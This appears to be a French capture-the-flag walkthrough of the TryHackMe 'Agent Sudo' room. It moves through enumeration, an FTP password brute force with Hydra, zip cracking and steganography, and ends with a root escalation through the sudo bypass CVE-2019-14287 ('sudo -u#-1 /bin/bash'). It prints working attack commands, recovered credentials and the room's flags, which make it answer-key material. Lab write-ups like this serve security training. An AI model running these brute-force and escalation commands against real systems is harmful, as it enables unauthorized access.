---
# Agent Sudo
---
# Enumération 
## Nmap 

```sudo nmap -sS -sV 10.10.243.133 -o nmap.txt
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-26 03:41 EST
Nmap scan report for 10.10.243.133
Host is up (0.037s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel```

3 ports ouverts 

Port 80 : 
```Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R ```

Il faut donc changer l'user-agent pour accdéder au site web 

Indice : Remplacer l'User-Agent par C 

## Burp 

On change l'user Agent et ca nous donne une URL : agent_C_attention.php 

## [IP]/agent_C_attention.php

```Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R```

Nom de l'agent : **chris**

---

# Hashing Cracking & Brute Force
## FTP Password

brute force du mot de passe du FTP 

```hydra -t 4 -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.243.133 -o credsFTP.txt 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-26 04:55:44
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ftp://10.10.243.133:21/
[STATUS] 68.00 tries/min, 68 tries in 00:01h, 14344331 to do in 3515:47h, 4 active
[STATUS] 68.33 tries/min, 205 tries in 00:03h, 14344194 to do in 3498:36h, 4 active
[21][ftp] host: 10.10.243.133   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-26 04:59:22```

```[21][ftp] host: 10.10.243.133   login: chris   password: crystal```

FTP_Creds : chris:crystal

## Zip file password 

On se connecte au ftp avec les creds 

on remarque un fichier spécifique : 

```ftp> ls
229 Entering Extended Passive Mode (|||56807|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.```

On le récupère pour l'ouvrir : 

```tp> get To_agentJ.txt
local: To_agentJ.txt remote: To_agentJ.txt
229 Entering Extended Passive Mode (|||12605|)
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
100% |***********************************************************************************************************************************************************************************************|   217       84.46 KiB/s    00:00 ETA
226 Transfer complete.
217 bytes received in 00:00 (7.14 KiB/s)```

```at To_agentJ.txt 
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C```

On comprends que d'autres creds sont cachés dans une photo cachée :
On récupère les 2 autres images :

```ftp> get cute-alien.jpg
local: cute-alien.jpg remote: cute-alien.jpg
229 Entering Extended Passive Mode (|||7885|)
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
100% |***********************************************************************************************************************************************************************************************| 33143        0.98 MiB/s    00:00 ETA
226 Transfer complete.
33143 bytes received in 00:00 (544.42 KiB/s)
ftp> get cut
cute-alien.jpg  cutie.png
ftp> get cutie.png
local: cutie.png remote: cutie.png
229 Entering Extended Passive Mode (|||21926|)
150 Opening BINARY mode data connection for cutie.png (34842 bytes).
100% |***********************************************************************************************************************************************************************************************| 34842      954.69 KiB/s    00:00 ETA
226 Transfer complete.
34842 bytes received in 00:00 (467.87 KiB/s)```

Quand on ouvre les images, ce sont des images banales, on va donc essayer de récupérer les métadonnées :

```┌──(kali㉿kali)-[~/Documents/TryHackMe/Practice/AgentSudo]
└─$ binwalk cute-alien.jpg 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01

                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/TryHackMe/Practice/AgentSudo]
└─$ binwalk cutie.png     

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22```

On remaque qu'il n'y a rien dans l'image cute-alien.png en revanche, il y a une archive zip dans cutie.png

RTFM ! 

``` ┌──(kali㉿kali)-[~/Documents/TryHackMe/Practice/AgentSudo]
└─$ binwalk -h            

Binwalk v2.3.3
Craig Heffner, ReFirmLabs
https://github.com/ReFirmLabs/binwalk

Usage: binwalk [OPTIONS] [FILE1] [FILE2] [FILE3] ...
[...]
Extraction Options:
    -e, --extract                Automatically extract known file types
[...]```

```┌──(kali㉿kali)-[~/Documents/TryHackMe/Practice/AgentSudo]
└─$ binwalk cutie.png -e

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression

WARNING: Extractor.execute failed to run external extractor 'jar xvf '%e'': [Errno 2] No such file or directory: 'jar', 'jar xvf '%e'' might not be installed correctly
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22

                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/TryHackMe/Practice/AgentSudo]
└─$ ls    
credsFTP.txt  cute-alien.jpg  cutie.png  _cutie.png.extracted  nmap.txt  README.md  To_agentJ.txt```

Ok, on a extrait le fichier caché de l'image : "_cutie.png.extracted" explorons le :

```┌──(kali㉿kali)-[~/…/TryHackMe/Practice/AgentSudo/_cutie.png.extracted]
└─$ ls -al
total 324
drwxr-xr-x 2 kali kali   4096 Jan 26 05:15 .
drwxr-xr-x 3 kali kali   4096 Jan 26 05:15 ..
-rw-r--r-- 1 kali kali 279312 Jan 26 05:15 365
-rw-r--r-- 1 kali kali  33973 Jan 26 05:15 365.zlib
-rw-r--r-- 1 kali kali    280 Jan 26 05:15 8702.zip
-rw-r--r-- 1 kali kali      0 Oct 29  2019 To_agentR.txt
```

On remarque :
* un ficher 365
* un fichier 365.zlib --> bibliothèque logicielle de compression de données
* un fichier zip protégé par un mdp. John?
* un fichier texte vide

Récupérons le mdp du zip avec john :   

``` ┌──(kali㉿kali)-[~/…/TryHackMe/Practice/AgentSudo/_cutie.png.extracted]
└─$ zip2john 8702.zip > 8702_pwd.hash
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/TryHackMe/Practice/AgentSudo/_cutie.png.extracted]
└─$ ls    
365  365.zlib  8702_pwd.hash  8702_pwd.txt  8702.zip  To_agentR.txt
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/TryHackMe/Practice/AgentSudo/_cutie.png.extracted]
└─$ rm 8702_pwd.txt 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/TryHackMe/Practice/AgentSudo/_cutie.png.extracted]
└─$ cat 8702_pwd.hash 
8702.zip/To_agentR.txt:$zip2$*0*1*0*4673cae714579045*67aa*4e*61c4cf3af94e649f827e5964ce575c5f7a239c48fb992c8ea8cbffe51d03755e0ca861a5a3dcbabfa618784b85075f0ef476c6da8261805bd0a4309db38835ad32613e3dc5d7e87c0f91c0b5e64e*4969f382486cb6767ae6*$/zip2$:To_agentR.txt:8702.zip:8702.zip
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/TryHackMe/Practice/AgentSudo/_cutie.png.extracted]
└─$ john 8702_pwd.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 7 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
alien            (8702.zip/To_agentR.txt)     
1g 0:00:00:00 DONE 2/3 (2024-01-26 05:21) 3.333g/s 171980p/s 171980c/s 171980C/s 123456..Dutchess1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. ```

```alien            (8702.zip/To_agentR.txt)```

mdp du zip : **alien**

## steg password

On va dézipper le fichier maitenant : 

```┌──(kali㉿kali)-[~/…/TryHackMe/Practice/AgentSudo/_cutie.png.extracted]
└─$ 7z e 8702.zip -palien 

7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20
 64-bit locale=en_US.UTF-8 Threads:7 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)

Extracting archive: 8702.zip
--
Path = 8702.zip
Type = zip
Physical Size = 280

    
Would you like to replace the existing file:
  Path:     ./To_agentR.txt
  Size:     0 bytes
  Modified: 2019-10-29 07:29:11
with the file from archive:
  Path:     To_agentR.txt
  Size:     86 bytes (1 KiB)
  Modified: 2019-10-29 07:29:11
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? y

Everything is Ok    

Size:       86
Compressed: 280
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/TryHackMe/Practice/AgentSudo/_cutie.png.extracted]
└─$ ls    
365  365.zlib  8702_pwd.hash  8702.zip  To_agentR.txt
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/TryHackMe/Practice/AgentSudo/_cutie.png.extracted]
└─$ ls -la
total 332
drwxr-xr-x 2 kali kali   4096 Jan 26 05:41 .
drwxr-xr-x 3 kali kali   4096 Jan 26 05:15 ..
-rw-r--r-- 1 kali kali 279312 Jan 26 05:15 365
-rw-r--r-- 1 kali kali  33973 Jan 26 05:15 365.zlib
-rw-r--r-- 1 kali kali    279 Jan 26 05:23 8702_pwd.hash
-rw-r--r-- 1 kali kali    280 Jan 26 05:15 8702.zip
-rw-r--r-- 1 kali kali     86 Oct 29  2019 To_agentR.txt```

Maitenant on voit que le fichier To_agentR.txt n'est plus vide :

```Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R```

On conclue que **QXJlYTUx** est un nouvel agent, mais le nom est codé en b64 

```┌──(kali㉿kali)-[~/…/TryHackMe/Practice/AgentSudo/_cutie.png.extracted]
└─$ echo 'QXJlYTUx' | base64 -d > new_agent

┌──(kali㉿kali)-[~/…/TryHackMe/Practice/AgentSudo/_cutie.png.extracted]
└─$ cat new_agent          
Area51```

## Who is the other agent (in full name)?

On comprends donc que l'image doit être envoyé à un nouvel agent, que cache cette image ? 

On doit utiliser la stéganograhpie pour comprendre :

``` ┌──(kali㉿kali)-[~/Documents/TryHackMe/Practice/AgentSudo]
└─$ steghide extract -sf cute-alien.jpg  
Enter passphrase: 
wrote extracted data to "message.txt".

┌──(kali㉿kali)-[~/Documents/TryHackMe/Practice/AgentSudo]
└─$ cat message.txt 
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

Nom du nouvel agent : **james**
SSH password : **hackerrules!**

---

# Capture the user flag
## What is the user flag ? 

On se connecte en SSH donc avec les creds james:hackerrules!

``` james@agent-sudo:~$ ls
Alien_autospy.jpg  user_flag.txt
james@agent-sudo:~$ cat user_flag.txt 
b03d975e8c92a7c04146cfa7a5a313c7```
 
User flag : **b03d975e8c92a7c04146cfa7a5a313c7**

## What is the incident of the photo called?

indice : Image inversée et Foxnews. 

FoxNews est un journal, parle-t'il d'autopsie d'alien ? 

Visiblement oui, premier [lien]https://www.foxnews.com/science/filmmaker-reveals-how-he-faked-infamous-roswell-alien-autopsy-footage-in-a-london-apartment : 

Filmmaker reveals how he faked infamous 'Roswell alien autopsy' footage in a London apartment

Incident : **Roswell alien autopsy**

---

# Privilege escalation 
## CVE number for the escalation 

Le Challenge est sorti en 2019 cherchons autour de cette année ? 

Réponse : **2019-14287**

## What is the root flag?
 
On exploite cette [CVE]https://www.exploit-db.com/exploits/47502

```james@agent-sudo:~$ sudo -u#-1 /bin/bash
[sudo] password for james: 
root@agent-sudo:~# whoami
root```

```root@agent-sudo:/# cd root/
root@agent-sudo:/root# ls
root.txt
root@agent-sudo:/root# cat root.txt 
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
root@agent-sudo:/root#```

root flag : **b53a02f55b57d4439e3341834d70c062**

Agent R : **DesKel**

---
